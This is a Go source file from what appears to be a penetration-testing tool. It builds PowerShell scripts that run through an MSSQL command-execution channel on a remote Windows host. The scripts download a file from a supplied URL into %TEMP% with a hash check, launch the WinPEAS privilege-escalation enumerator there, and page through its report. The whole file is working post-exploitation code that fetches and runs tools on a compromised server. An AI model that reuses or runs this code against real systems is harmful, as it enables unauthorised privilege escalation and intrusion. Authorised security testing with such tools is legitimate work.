package tui

import (
	"fmt"
	"github.com/masterzen/winrm"
	"strings"
)

func mssqlPowerShellQuery(script string) string {
	command := winrm.Powershell("$ErrorActionPreference='Stop'; " + script)
	return mssqlCommandQuery(command)
}
func mssqlPSLiteral(value string) string { return "'" + strings.ReplaceAll(value, "'", "''") + "'" }
func mssqlRemotePath(path string) string {
	if strings.HasPrefix(strings.ToUpper(path), `%TEMP%\`) {
		return "$env:TEMP+" + mssqlPSLiteral(path[len("%TEMP%"):])
	}
	return mssqlPSLiteral(path)
}
func mssqlDownloadScript(source, destination, hash string) string {
	return "$p=" + mssqlRemotePath(destination) + "; if(Test-Path -LiteralPath $p){throw 'Destination already exists'}; $part=$p+'.'+[guid]::NewGuid().ToString()+'.part'; try {(New-Object Net.WebClient).DownloadFile(" + mssqlPSLiteral(source) + ",$part); if((Get-FileHash -LiteralPath $part -Algorithm SHA256).Hash -ne " + mssqlPSLiteral(hash) + "){throw 'SHA256 mismatch'}; Move-Item -LiteralPath $part -Destination $p; Write-Output ('TRANSFER_OK '+$p)} finally {if(Test-Path -LiteralPath $part){Remove-Item -LiteralPath $part}}"
}
func mssqlWinPEASScript(path string) string {
	return "$p=" + mssqlRemotePath(path) + "; if(!(Test-Path -LiteralPath $p -PathType Leaf)){throw 'WinPEAS file not found'}; $out=$p+'.txt'; $err=$p+'.stderr.txt'; if((Test-Path -LiteralPath $out) -or (Test-Path -LiteralPath $err)){throw 'Report already exists; choose another binary path or remove old report'}; $proc=Start-Process -FilePath $p -ArgumentList 'notcolor' -RedirectStandardOutput $out -RedirectStandardError $err -PassThru; Write-Output ('WINPEAS_PID '+$proc.Id); Write-Output ('REPORT '+$out)"
}
func mssqlReportScript(path string, offset int) string {
	return fmt.Sprintf("$p=%s; Get-Item -LiteralPath $p | Select-Object FullName,Length,LastWriteTime | Format-List | Out-String; Get-Content -LiteralPath $p | Select-Object -Skip %d -First 400", mssqlRemotePath(path), offset)
}

func mssqlResultHasMarker(result map[string]any, marker string) bool {
	sets, _ := result["ResultSets"].([]map[string]any)
	for _, set := range sets {
		rows, _ := set["Rows"].([][]any)
		for _, row := range rows {
			for _, value := range row {
				if text, ok := value.(string); ok && strings.HasPrefix(text, marker) {
					return true
				}
			}
		}
	}
	return false
}
